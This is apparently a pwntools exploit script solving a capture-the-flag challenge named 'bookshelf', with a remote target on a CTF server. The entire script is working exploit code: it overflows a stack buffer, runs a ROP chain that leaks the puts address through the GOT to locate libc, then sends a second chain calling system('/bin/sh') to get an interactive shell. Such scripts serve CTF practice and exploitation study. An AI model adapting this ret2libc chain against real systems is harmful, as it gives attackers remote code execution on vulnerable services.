#!/usr/bin/python3

from pwn import *

exe = ELF('bookshelf_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chal.pctf.competitivecyber.club', 8989)
else:
        p = process(exe.path)

GDB()
def write():
    sla(b">>", '1')
    sla(b">>", b'y'*40)
def admin(payload):
    sla(b">>", '3')
    sla(b">>", payload)
    
write()
payload = b'a'*48 + b'a'*8 + p64(0x000000000040101c) + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.main)

admin(payload)
p.recvuntil(b"Book saved!\n")
libc.address = u64(p.recvline(keepends=False).ljust(8, b'\0')) - libc.sym.puts
print(hex(libc.address))

payload = b'a'*56 +p64(0x000000000040101a) + p64(0x000000000040101c) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
write() 
admin(payload)
p.interactive()
